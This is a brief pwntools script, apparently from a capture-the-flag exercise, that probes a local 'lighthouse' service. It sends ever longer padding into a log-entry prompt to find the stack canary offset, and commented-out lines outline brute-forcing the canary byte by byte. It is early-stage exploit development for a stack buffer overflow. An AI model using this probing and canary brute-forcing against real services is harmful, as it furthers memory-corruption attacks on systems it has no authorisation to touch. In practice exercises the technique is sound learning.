from pwn import *
import time

HOST, PORT = '127.0.0.1', 9001
#OFFSET_TO_CANARY = 0
#OFFSET_TO_RIP = 0
elf = ELF('./lighthouse', checksec=False)
#known = b"\x00"
#for i in range(7):
for canaryOff in range(128,512):
   # guess = known + bytes([bval])
    payload = b"A" * canaryOff
    io = remote(HOST, PORT, level='error')
    try:
        io.recvuntil(b"> ")
        io.sendline(b"1")

        io.recvuntil(b"log entry: ")
        io.sendline(payload)
    
        data = io.recvall(timeout=1)
    except EOFError:
        data = b""
        io.close()
    if b"stack smashing detected" in data:
    #known = guess
    #log.success(f"byte {i+1}: {bval:02x}")
        log.info(f"Canary offset is: {canaryOff-1}")
        break

io.interactive()
